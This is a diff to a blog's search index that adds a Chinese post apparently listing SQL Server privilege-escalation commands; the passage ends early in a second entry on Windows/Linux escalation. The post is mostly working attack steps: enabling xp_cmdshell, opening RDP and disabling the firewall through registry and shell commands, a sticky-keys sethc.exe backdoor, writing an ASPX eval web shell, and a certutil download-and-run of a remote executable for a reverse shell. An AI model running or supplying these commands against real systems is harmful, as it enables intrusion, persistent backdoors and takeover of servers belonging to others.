@@ -1,6 +1,67 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>sql server提权相关命令</title>
+    <url>/2019/12/02/sql-server%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<p>1、查看数据库版本</p><pre><code>select @@version</code></pre><p>SQL server2005 以上xp_cmdshell默认没开启<br>2、开启SQL server的xp_cmdshell功能</p><a id="more"></a>
+
+
+<pre><code>exec sp_configure 'show advanced options', 1;reconfigure;
+exec sp_configure 'xp_cmdshell',1;reconfigure;</code></pre>
+<p>3、关闭SQL server的xp_cmdshell功能</p>
+<pre><code>exec sp_configure 'show advanced options', 1;reconfigure;
+exec sp_configure 'xp_cmdshell', 0;reconfigure</code></pre>
+<p>4、执行cmd命令</p>
+<pre><code>exec xp_cmdshell 'whoami';</code></pre>
+<p>5、若net user提示拒绝访问（命令意思为将net.exe赋予可执行权限）</p>
+<pre><code>exec xp_cmdshell 'echo y|cacls net.exe /g system:f';</code></pre>
+<p>6、是否开启远程桌面（1：表示关闭，0：表示开启）</p>
+<pre><code>EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\Terminal Server',
+'fDenyTSConnections'</code></pre>
+<p>7、读取远程桌面端口</p>
+<pre><code>EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp',
+'PortNumber'</code></pre>
+<p>8、开启远程桌面</p>
+<pre><code>EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\TerminalServer',
+'fDenyTSConnections','REG_DWORD',0;</code></pre>
+<p>9、通过上传3389.bat</p>
+<pre><code>echo Windows Registry Editor Version 5.00>>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>3389.reg 
+echo "fDenyTSConnections"=dword:00000000>>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>3389.reg 
+echo "PortNumber"=dword:00000d3d>>3389.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>3389.reg 
+echo "PortNumber"=dword:00000d3d>>3389.reg 
+regedit /s 3389.reg 
+del 3389.reg</code></pre>
+<pre><code>exec xp_cmdshell 'D:\WEB\3389.bat'</code></pre>
+<p>10.关闭防火墙</p>
+<pre><code>exec xp_cmdshell 'netsh firewall set opmode mode=disable'</code></pre>
+<p>11.sa无xp_cmdshell下的提权</p>
+<pre><code>declare @o int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';</code></pre>
+<pre><code>declare @oo int
+exec sp_oacreate 'scripting.filesystemobject', @oo out
+exec sp_oamethod @oo, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';</code></pre>
+<p>成功后3389登陆按五次shift键。成功进入服务器。<br>一直向上点”我的电脑“右键“管理” 用户管理直接加用户。<br>12.直接写shell</p>
+<pre><code>exec master..xp_cmdshell 'echo  ^<%@ page language="Jscript" %^>^<%eval(request.item["pass"],"unsafe");%^> > D:\web\upfile\affix\1.aspx'</%eval(request.item["pass"],"unsafe");%^></%@></code></pre>
+<p>13.下载远程的可执行文件，通过该方式可用于反弹shell</p>
+<pre><code># 下载恶意程序
+exec master.dbo.xp_cmdshell 'cd c:\\www & certutil -urlcache -split -f http://ip/file.exe';
+执行程序
+exec master.dbo.xp_cmdshell 'cd c:\\www & file.exe';</code></pre>]]></content>
+      <categories>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>sql server提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>windows/linux快速提权</title>
     <url>/2019/11/28/windows-linux%E5%BF%AB%E9%80%9F%E6%8F%90%E6%9D%83/</url>
     <content><![CDATA[<h1 id="windows提权-快速查找exp"><a href="#windows提权-快速查找exp" class="headerlink" title="windows提权-快速查找exp"></a>windows提权-快速查找exp</h1><p>微软官方时刻关注列表网址：<br><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017</a><br><img src="/images/pasted-46.png" alt="upload successful"><br>比如常用的几个已公布的 exp：<br>KB2592799<br>KB3000061<br>KB2592799<br>…<br>快速查找未打补丁的 exp，可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下：</p><a id="more"></a>
